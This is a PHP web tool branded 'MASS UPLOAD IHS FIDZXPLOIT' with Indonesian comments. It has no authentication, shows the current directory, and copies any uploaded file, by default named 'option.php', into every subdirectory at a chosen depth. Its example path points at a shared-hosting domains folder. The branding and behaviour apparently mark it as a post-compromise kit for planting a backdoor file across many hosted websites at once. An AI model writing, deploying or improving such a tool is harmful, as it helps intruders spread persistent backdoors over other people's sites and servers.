<?php
// Error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Fungsi untuk mendapatkan direktori saat ini
function getCurrentDirectory() {
    return getcwd();
}

// Fungsi untuk mendapatkan semua direktori dalam path tertentu
function getAllDirectories($basePath, $maxDepth = 5) {
    $directories = [];
    
    if (!is_dir($basePath)) {
        return $directories;
    }
    
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $path => $dir) {
        if ($dir->isDir()) {
            $depth = $iterator->getDepth();
            if ($depth <= $maxDepth) {
                $directories[] = [
                    'path' => $path,
                    'depth' => $depth,
                    'name' => basename($path)
                ];
            }
        }
    }
    
    return $directories;
}

// Fungsi untuk upload file ke multiple direktori dengan output real-time
function massUpload($sourceFile, $targetDirectories, $fileName) {
    $results = [];
    $uploadCount = 0;
    
    foreach ($targetDirectories as $dirInfo) {
        $dirPath = is_array($dirInfo) ? $dirInfo['path'] : $dirInfo;
        $targetPath = $dirPath . '/' . $fileName;
        
        // Buat backup file jika sudah ada
        if (file_exists($targetPath)) {
            $backupPath = $targetPath . '.backup_' . date('Y-m-d_H-i-s');
            copy($targetPath, $backupPath);
        }
        
        if (copy($sourceFile, $targetPath)) {
            $result = [
                'status' => 'success',
                'path' => $targetPath,
                'location' => $targetPath // Gunakan path langsung sebagai lokasi
            ];
            $results[] = $result;
            $uploadCount++;
            
            // Output real-time
            echo '<div class="url-item success">';
            echo '✅ <strong>SUKSES:</strong> ';
            echo '<span style="color: #00ff00;">' . $targetPath . '</span>';
            echo '</div>';
            flush();
            ob_flush();
        } else {
            $result = [
                'status' => 'error',
                'path' => $targetPath,
                'error' => 'Gagal mengupload file'
            ];
            $results[] = $result;
            
            // Output real-time
            echo '<div class="url-item error">';
            echo '❌ <strong>GAGAL:</strong> ';
            echo $result['path'] . ' - ';
            echo '<span style="color: #ff6666;">' . $result['error'] . '</span>';
            echo '</div>';
            flush();
            ob_flush();
        }
        
        // Delay kecil untuk efek visual
        usleep(100000); // 0.1 detik
    }
    
    return [
        'total' => count($targetDirectories),
        'success' => $uploadCount,
        'failed' => count($targetDirectories) - $uploadCount
    ];
}

// Proses form submission
$uploadResult = null;
$selectedPath = getCurrentDirectory();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $manualPath = $_POST['manual_path'] ?? $selectedPath;
    $depth = intval($_POST['depth'] ?? 1);
    $fileName = $_POST['file_name'] ?? 'option.php';
    
    // Validasi path manual
    if (!empty($manualPath) && is_dir($manualPath)) {
        $selectedPath = $manualPath;
    }
    
    // Validasi depth
    $depth = max(1, min(5, $depth));
    
    // Dapatkan semua direktori target
    $targetDirs = getAllDirectories($selectedPath, $depth);
    
    // Filter hanya direktori dengan depth sesuai (subdirektori saja)
    $filteredDirs = array_filter($targetDirs, function($dir) use ($depth) {
        return $dir['depth'] == $depth;
    });
    
    // Jika tidak ada di depth tertentu, ambil semua
    if (empty($filteredDirs)) {
        $filteredDirs = $targetDirs;
    }
    
    // Upload file
    if (!empty($filteredDirs) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $tempFile = $_FILES['upload_file']['tmp_name'];
        
        // Mulai output real-time
        echo '<div class="output">';
        echo '<h3>📊 Proses Upload Massal:</h3>';
        echo '<div class="stats">';
        echo '<div class="stat-box">';
        echo '<div>Total Direktori</div>';
        echo '<div style="font-size: 1.5rem;">' . count($filteredDirs) . '</div>';
        echo '</div>';
        echo '</div>';
        echo '<h4>📝 Lokasi File yang Diupload:</h4>';
        echo '<div class="url-list">';
        
        $uploadResult = massUpload($tempFile, $filteredDirs, $fileName);
        
        echo '</div>';
        echo '</div>';
    }
}

$currentDir = getCurrentDirectory();
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mass Upload Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            line-height: 1.6;
        }
        
        .banner {
            text-align: center;
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff00;
            animation: glow 1.5s ease-in-out infinite alternate;
            padding: 15px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .info-box {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .upload-form {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        input[type="file"],
        input[type="number"],
        input[type="text"],
        button {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        
        input[type="text"] {
            font-size: 0.9rem;
        }
        
        button {
            background: rgba(0, 255, 0, 0.2);
            cursor: pointer;
            font-weight: bold;
            font-size: 1.2rem;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        button:hover {
            background: rgba(0, 255, 0, 0.3);
            transform: translateY(-2px);
        }
        
        .output {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 5px;
            margin-top: 20px;
            max-height: 600px;
            overflow-y: auto;
        }
        
        .success {
            color: #00ff00;
        }
        
        .error {
            color: #ff0000;
        }
        
        .url-list {
            margin-top: 10px;
        }
        
        .url-item {
            padding: 10px;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
            word-break: break-all;
            font-size: 0.9rem;
            animation: fadeIn 0.5s ease-in;
            background: rgba(0, 255, 0, 0.05);
            margin-bottom: 5px;
            border-radius: 3px;
        }
        
        @keyframes glow {
            from {
                text-shadow: 0 0 10px #00ff00;
            }
            to {
                text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .stat-box {
            text-align: center;
            padding: 10px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .simple-info {
            color: #ffff00;
            font-size: 0.8rem;
            margin-top: 3px;
            opacity: 0.7;
        }
        
        .path-display {
            font-family: 'Courier New', monospace;
            color: #00ff00;
            background: rgba(0, 255, 0, 0.1);
            padding: 8px;
            border-radius: 3px;
            border: 1px solid rgba(0, 255, 0, 0.3);
            margin-top: 5px;
            word-break: break-all;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="banner">
            MASS UPLOAD IHS FIDZXPLOIT
        </div>
        
        <div class="info-box">
            <strong>$ pwd:</strong> 
            <div class="path-display"><?php echo $currentDir; ?></div>
        </div>
        
        <div class="upload-form">
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label>📁 Path Direktori Awal:</label>
                    <input type="text" name="manual_path" value="<?php echo $currentDir; ?>" 
                           placeholder="Masukkan path lengkap direktori awal..." required>
                    <div class="simple-info">Contoh: /home/u332834506/domains/</div>
                </div>
                
                <div class="form-group">
                    <label>📄 File untuk Upload Massal:</label>
                    <input type="file" name="upload_file" required>
                </div>
                
                <div class="form-group">
                    <label>📝 Nama File Target:</label>
                    <input type="text" name="file_name" value="option.php" required>
                    <div class="simple-info">Nama file di setiap direktori</div>
                </div>
                
                <div class="form-group">
                    <label>📊 Kedalaman:</label>
                    <input type="number" name="depth" min="1" max="5" value="1" required>
                    <div class="simple-info">Level subdirektori (1-5)</div>
                </div>
                
                <button type="submit">🚀 START MASS UPLOAD!</button>
            </form>
        </div>
        
        <?php if ($uploadResult): ?>
            <div class="info-box">
                <div class="stats">
                    <div class="stat-box">
                        <div>Total</div>
                        <div style="font-size: 1.5rem;"><?php echo $uploadResult['total']; ?></div>
                    </div>
                    <div class="stat-box success">
                        <div>Berhasil</div>
                        <div style="font-size: 1.5rem;"><?php echo $uploadResult['success']; ?></div>
                    </div>
                    <div class="stat-box error">
                        <div>Gagal</div>
                        <div style="font-size: 1.5rem;"><?php echo $uploadResult['failed']; ?></div>
                    </div>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        // Auto-focus pada input path
        document.querySelector('input[name="manual_path"]').focus();
        
        // Konfirmasi sebelum upload
        document.querySelector('form').addEventListener('submit', function(e) {
            const path = document.querySelector('input[name="manual_path"]').value;
            const depth = document.querySelector('input[name="depth"]').value;
            const fileName = document.querySelector('input[name="file_name"]').value;
            
            if (!confirm(`🚀 MULAI MASS UPLOAD?\n\nPath: ${path}\nKedalaman: ${depth}\nFile: ${fileName}`)) {
                e.preventDefault();
            }
        });
        
        // Auto-scroll ke output saat upload
        <?php if ($uploadResult): ?>
            setTimeout(() => {
                const output = document.querySelector('.output');
                if (output) {
                    output.scrollIntoView({ behavior: 'smooth' });
                }
            }, 100);
        <?php endif; ?>
    </script>
</body>
</html>
